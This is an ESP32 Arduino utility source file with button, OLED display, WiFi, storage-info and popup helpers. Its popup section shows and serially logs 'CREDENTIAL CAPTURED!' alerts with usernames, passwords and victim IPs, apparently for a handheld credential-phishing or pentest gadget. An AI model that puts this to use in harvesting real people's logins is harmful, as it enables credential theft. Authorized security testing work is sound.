#include "utils.h"
#include "pins.h"
#include "config.h"
#include <U8g2lib.h>
#include <WiFi.h>
#include <SPIFFS.h>
#include <esp_spi_flash.h>
#include <esp_flash.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// =================================================
// 4 BUTTONS ONLY
// =================================================
const int buttonPins[4] = {BTN_SELECT, BTN_UP, BTN_DOWN, BTN_BACK};
unsigned long lastPress[4] = {0};

// =================================================
// BUTTON FUNCTIONS
// =================================================

bool isButtonPressed(int pin) {
  for(int i=0; i<4; i++) {
    if(buttonPins[i] == pin) {
      if(digitalRead(pin)==LOW && millis()-lastPress[i]>DEBOUNCE) {
        lastPress[i] = millis(); 
        return true;
      }
    }
  }
  return false;
}

// =================================================
// DISPLAY FUNCTIONS
// =================================================

void CenteredStr(uint8_t y, const char* text) {
  int16_t w = u8g2.getUTF8Width(text);
  u8g2.setCursor((128-w)/2, y); 
  u8g2.print(text);
}

// =================================================
// TIME FUNCTIONS
// =================================================

String getTimestampStr() {
  unsigned long now = millis() / 1000;
  int hours = (now % 86400) / 3600;
  int minutes = (now % 3600) / 60;
  int seconds = now % 60;
  return String(hours) + "h " + String(minutes) + "m " + String(seconds) + "s";
}

// =================================================
// WIFI FUNCTIONS
// =================================================

void disableWiFi() {
  WiFi.mode(WIFI_OFF);
  WiFi.disconnect(true);
  delay(100);
}

void enableWiFi() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
}

// =================================================
// STORAGE INFO FUNCTIONS
// =================================================

void printStorageInfo() {
    Serial.println("\n========================================");
    Serial.println("📊 ESP32 STORAGE INFO");
    Serial.println("========================================");
    
    uint32_t flashSize = ESP.getFlashChipSize();
    uint32_t flashUsed = ESP.getSketchSize();
    uint32_t flashFree = flashSize - flashUsed;
    float flashUsedPercent = ((float)flashUsed / flashSize) * 100;
    
    Serial.println("💾 FLASH MEMORY:");
    Serial.printf("  Total:     %d MB\n", flashSize / (1024 * 1024));
    Serial.printf("  Used:      %d KB (%.1f%%)\n", flashUsed / 1024, flashUsedPercent);
    Serial.printf("  Free:      %d KB (%.1f%%)\n", flashFree / 1024, 100 - flashUsedPercent);
    
    uint32_t heapTotal = ESP.getHeapSize();
    uint32_t heapFree = ESP.getFreeHeap();
    uint32_t heapUsed = heapTotal - heapFree;
    float heapUsedPercent = ((float)heapUsed / heapTotal) * 100;
    
    Serial.println("\n🧠 RAM (Heap):");
    Serial.printf("  Total:     %d KB\n", heapTotal / 1024);
    Serial.printf("  Used:      %d KB (%.1f%%)\n", heapUsed / 1024, heapUsedPercent);
    Serial.printf("  Free:      %d KB (%.1f%%)\n", heapFree / 1024, 100 - heapUsedPercent);
    
    if (ESP.getPsramSize() > 0) {
        uint32_t psramTotal = ESP.getPsramSize();
        uint32_t psramFree = ESP.getFreePsram();
        uint32_t psramUsed = psramTotal - psramFree;
        Serial.println("\n💠 PSRAM:");
        Serial.printf("  Total:     %d KB\n", psramTotal / 1024);
        Serial.printf("  Used:      %d KB\n", psramUsed / 1024);
        Serial.printf("  Free:      %d KB\n", psramFree / 1024);
    }
    
    if (SPIFFS.begin(true)) {
        size_t spiffsTotal = SPIFFS.totalBytes();
        size_t spiffsUsed = SPIFFS.usedBytes();
        size_t spiffsFree = spiffsTotal - spiffsUsed;
        float spiffsUsedPercent = ((float)spiffsUsed / spiffsTotal) * 100;
        
        Serial.println("\n📁 SPIFFS:");
        Serial.printf("  Total:     %d KB\n", spiffsTotal / 1024);
        Serial.printf("  Used:      %d KB (%.1f%%)\n", spiffsUsed / 1024, spiffsUsedPercent);
        Serial.printf("  Free:      %d KB\n", spiffsFree / 1024);
        SPIFFS.end();
    }
    
    Serial.println("\n🔧 BOARD INFO:");
    Serial.printf("  Chip Model: %s\n", ESP.getChipModel());
    Serial.printf("  Cores:      %d\n", ESP.getChipCores());
    Serial.printf("  Frequency:  %d MHz\n", ESP.getCpuFreqMHz());
    Serial.printf("  SDK:        %s\n", ESP.getSdkVersion());
    
    Serial.println("========================================\n");
}

String getStorageInfoString() {
    String info = "";
    uint32_t flashSize = ESP.getFlashChipSize();
    uint32_t flashUsed = ESP.getSketchSize();
    float flashPercent = ((float)flashUsed / flashSize) * 100;
    
    info += "Flash: ";
    info += flashUsed / 1024;
    info += "/";
    info += flashSize / (1024 * 1024);
    info += "MB ";
    info += String(flashPercent, 1);
    info += "%\n";
    
    uint32_t heapTotal = ESP.getHeapSize();
    uint32_t heapFree = ESP.getFreeHeap();
    float heapPercent = ((float)(heapTotal - heapFree) / heapTotal) * 100;
    
    info += "RAM: ";
    info += (heapTotal - heapFree) / 1024;
    info += "/";
    info += heapTotal / 1024;
    info += "KB ";
    info += String(heapPercent, 1);
    info += "%\n";
    
    if (SPIFFS.begin(true)) {
        size_t spiffsTotal = SPIFFS.totalBytes();
        size_t spiffsUsed = SPIFFS.usedBytes();
        float spiffsPercent = ((float)spiffsUsed / spiffsTotal) * 100;
        
        info += "SPIFFS: ";
        info += spiffsUsed / 1024;
        info += "/";
        info += spiffsTotal / 1024;
        info += "KB ";
        info += String(spiffsPercent, 1);
        info += "%";
        SPIFFS.end();
    }
    
    return info;
}

void drawStorageInfoOLED() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    CenteredStr(10, "Storage Info");
    u8g2.drawLine(0, 12, 128, 12);
    
    char buf[30];
    
    uint32_t flashSize = ESP.getFlashChipSize();
    uint32_t flashUsed = ESP.getSketchSize();
    float flashPct = ((float)flashUsed / flashSize) * 100;
    sprintf(buf, "Flash: %d/%dMB", flashUsed / (1024*1024), flashSize / (1024*1024));
    u8g2.setCursor(5, 24);
    u8g2.print(buf);
    sprintf(buf, "Used: %.1f%%", flashPct);
    u8g2.setCursor(5, 34);
    u8g2.print(buf);
    
    uint32_t heapTotal = ESP.getHeapSize();
    uint32_t heapFree = ESP.getFreeHeap();
    float heapPct = ((float)(heapTotal - heapFree) / heapTotal) * 100;
    sprintf(buf, "RAM: %d/%dKB", (heapTotal - heapFree) / 1024, heapTotal / 1024);
    u8g2.setCursor(5, 46);
    u8g2.print(buf);
    sprintf(buf, "Used: %.1f%%", heapPct);
    u8g2.setCursor(5, 56);
    u8g2.print(buf);
    
    sprintf(buf, "Free Flash: %dKB", (flashSize - flashUsed) / 1024);
    u8g2.setCursor(5, 63);
    u8g2.print(buf);
    
    u8g2.sendBuffer();
}

// =================================================
// UNIFIED POPUP SYSTEM
// =================================================

// Popup state variables
bool g_showPopup = false;
bool g_showCredPopup = false;
String g_popupLine1 = "";
String g_popupLine2 = "";
String g_popupLine3 = "";
String g_lastCredUsername = "";
String g_lastCredPassword = "";
String g_lastCredIP = "";
String g_lastCredType = "";
unsigned long g_popupStartTime = 0;
const unsigned long POPUP_DURATION = 2000;
const unsigned long CRED_POPUP_DURATION = 5000;

// Draw a medium framed box - perfectly sized for feedback
void drawPopupFrame() {
    // Medium frame - bigger than menu item, smaller than full screen
    // x=6, y=12, width=116, height=40, radius=8
    u8g2.drawRFrame(6, 12, 116, 40, 8);
}

// Show a generic popup message with transparent frame
void showPopupMessage(const char* line1, const char* line2, const char* line3) {
    g_popupLine1 = line1;
    g_popupLine2 = line2;
    g_popupLine3 = line3;
    g_showPopup = true;
    g_popupStartTime = millis();
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    // Draw framed box - NO black fill, just border
    drawPopupFrame();
    
    // Draw text in white (foreground)
    int yPos = 24;
    if (strlen(line1) > 0) {
        CenteredStr(yPos, line1);
        yPos += 12;
    }
    if (strlen(line2) > 0) {
        CenteredStr(yPos, line2);
        yPos += 12;
    }
    if (strlen(line3) > 0) {
        CenteredStr(yPos, line3);
    }
    
    u8g2.sendBuffer();
    
    Serial.printf("📱 POPUP: %s | %s | %s\n", line1, line2, line3);
}

// Show a credential popup with transparent frame
void showCredentialPopup(const char* username, const char* password, const char* ip, const char* type) {
    g_lastCredUsername = username;
    g_lastCredPassword = password;
    g_lastCredIP = ip;
    g_lastCredType = type;
    g_showCredPopup = true;
    g_popupStartTime = millis();
    
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    
    // Draw framed box - NO black fill, just border
    drawPopupFrame();
    
    // Title
    CenteredStr(20, "🔑 CREDENTIAL CAPTURED!");
    
    // Separator line
    u8g2.drawLine(14, 23, 114, 23);
    
    // Username
    u8g2.setCursor(12, 34);
    u8g2.print("User: ");
    u8g2.print(username);
    
    // Password
    u8g2.setCursor(12, 44);
    u8g2.print("Pass: ");
    u8g2.print(password);
    
    // IP (on right side)
    u8g2.setCursor(75, 34);
    u8g2.print("IP: ");
    u8g2.print(ip);
    
    u8g2.sendBuffer();
    
    Serial.println("📱 CREDENTIAL POPUP SHOWN ON OLED");
    Serial.printf("  User: %s\n", username);
    Serial.printf("  Pass: %s\n", password);
    Serial.printf("  IP: %s\n", ip);
    Serial.printf("  Type: %s\n", type);
}

// Check and draw popup if active - call this in module loops
bool drawPopupIfActive() {
    // Check credential popup
    if (g_showCredPopup) {
        if (millis() - g_popupStartTime > CRED_POPUP_DURATION) {
            g_showCredPopup = false;
            return false;
        }
        
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        drawPopupFrame();
        
        CenteredStr(20, "🔑 CREDENTIAL CAPTURED!");
        u8g2.drawLine(14, 23, 114, 23);
        
        u8g2.setCursor(12, 34);
        u8g2.print("User: ");
        u8g2.print(g_lastCredUsername.c_str());
        
        u8g2.setCursor(12, 44);
        u8g2.print("Pass: ");
        u8g2.print(g_lastCredPassword.c_str());
        
        u8g2.setCursor(75, 34);
        u8g2.print("IP: ");
        u8g2.print(g_lastCredIP.c_str());
        
        u8g2.sendBuffer();
        return true;
    }
    
    // Check generic popup
    if (g_showPopup) {
        if (millis() - g_popupStartTime > POPUP_DURATION) {
            g_showPopup = false;
            return false;
        }
        
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        drawPopupFrame();
        
        int yPos = 24;
        if (g_popupLine1.length() > 0) {
            CenteredStr(yPos, g_popupLine1.c_str());
            yPos += 12;
        }
        if (g_popupLine2.length() > 0) {
            CenteredStr(yPos, g_popupLine2.c_str());
            yPos += 12;
        }
        if (g_popupLine3.length() > 0) {
            CenteredStr(yPos, g_popupLine3.c_str());
        }
        
        u8g2.sendBuffer();
        return true;
    }
    
    return false;
}

// Clear popup state
void clearPopup() {
    g_showPopup = false;
    g_showCredPopup = false;
    g_popupLine1 = "";
    g_popupLine2 = "";
    g_popupLine3 = "";
    g_lastCredUsername = "";
    g_lastCredPassword = "";
    g_lastCredIP = "";
    g_lastCredType = "";
}